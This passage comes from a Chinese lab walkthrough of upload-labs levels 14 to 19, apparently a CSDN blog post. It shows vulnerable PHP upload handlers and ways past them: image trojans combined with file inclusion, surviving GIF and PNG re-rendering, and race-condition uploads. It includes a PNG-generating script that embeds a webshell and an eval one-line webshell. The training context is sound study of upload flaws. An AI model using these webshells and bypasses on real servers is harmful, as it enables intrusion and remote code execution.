class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先使用一张正常的图片和包含木马的php文件，然后合成一个包含木马内容的图片<br><img src="https://img-blog.csdnimg.cn/88c153ffbd5e4d91b0c6b553bc7ff997.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/070ce8dc04dd4515a941bda9e93bbb0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上传成功也可以正常访问<br><img src="https://img-blog.csdnimg.cn/691c97147d574d0c998f88c6e28693d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/36fdd75cfb944dc3b3768fc36cb5f216.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>紧接着我们要利用LFI漏洞对图片马进行上线(经过反复测试，PHP5.0低版本的都不能成功解析图片木马，可能要5.6以上的版本才能解析成功)</p>
<p><img src="https://img-blog.csdnimg.cn/655f50c42b054d4d9abd9278fa3703e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/907be04871ad4978bdb1f67ec437c937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-15"><a href="#PASS-15" class="headerlink" title="PASS-15"></a>PASS-15</h2><p>和第14关相同，但是这里使用的是<code>getimagesize</code>函数检查上传的是否为图片，利用方法和上面一致</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PASS-16"><a href="#PASS-16" class="headerlink" title="PASS-16"></a>PASS-16</h2><p>这关使用的是<code>exif_imagetype</code>函数检查是否为图片文件，利用方式和上面一致。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PASS-17"><a href="#PASS-17" class="headerlink" title="PASS-17"></a>PASS-17</h2><p>这一题是一个二次渲染绕过，这个题要相较上面那些要困难一些。这个代码的思路是先让我们上传一张图片，然后它再将图片移动到指定的位置，如果成功则重新创建一张新的图片，<code>imagecreatefromjpeg</code>函数若执行成功，则判断上传的是一张图片，若失败，则返回错误信息。因为不同的文件格式利用姿势都不相同，并且在实战中也经常会遇到，所以我这里详细介绍一下利用姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>GIF格式</strong></p>
</blockquote>
<p>首先我们先上传一张带有一句话木马的GIF图片到服务器上，上传成功但是却不能上线成功。我们将上传的图片下载下来，使用010editor编辑器查看的时候发现，最后的一句话木马内容被二次渲染删除了<br><img src="https://img-blog.csdnimg.cn/9b5eba837f7c4b0aac13a32b7b2d6c77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对比一下原木马文件和被二次渲染的图片，发现前面一部分是相同的，那我们可以将我们的木马内容嵌套在里面<br><img src="https://img-blog.csdnimg.cn/7954f9e7758145578101d054eb04f4a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1a547a9bcad1414a83b3c0a2429a01c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上传成功后我们可以使用LFI漏洞进行利用成功，并成功上线<br><img src="https://img-blog.csdnimg.cn/7764f734f74841a79cef9587963b54b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/feceb518cf5c46f4a9be08e2819dba86.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>PNG</strong></p>
</blockquote>
<p>png图片的绕过就比较复杂了，因为涉及的原理和因素很多。我们这里先使用一个脚本，目的是写入IDAT数据块。IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./beautifulGirl.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先成功生成一张图片，然后我们分析一下里面的十六进制代码<br><img src="https://img-blog.csdnimg.cn/2b71399776834b3f9862590f187f6c8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以看到IDATH数据块上写入了一段php代码<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，这段代码里包含了GET参数和POST参数，需要利用LFI漏洞对这两个参数进行同时利用才能利用成功<br><img src="https://img-blog.csdnimg.cn/9aa60f0810124418a06b1de67b991e36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-18"><a href="#PASS-18" class="headerlink" title="PASS-18"></a>PASS-18</h2><p>从代码中分析可以看到，它使用了白名单过滤，只允许上传jpg、png和gif格式的文件。它和之前的白名单过滤不一样，它最后是重命名了文件之后再保存，如果不是这三种文件格式，就把文件删除。我们这样就可以尝试使用条件竞争的方式把我们的webshell文件在被服务器删除之前进行利用，利用难度较大。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后我们抓一个上传的包，清除所有的参数，并将类型换为空payload，线程调到500<br><img src="https://img-blog.csdnimg.cn/dfeb1e9e1e9b430f84a5e11ebee86480.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fbbfbf0c32e3467797bb745be57e3559.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/95f6a38852914560908c7a102ace1277.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/142aebd2b2f044538a9bb6bf96e61874.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-19"><a href="#PASS-19" class="headerlink" title="PASS-19"></a>PASS-19</h2><p>和前一关类似，只不过结和前面几关的方法，对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span 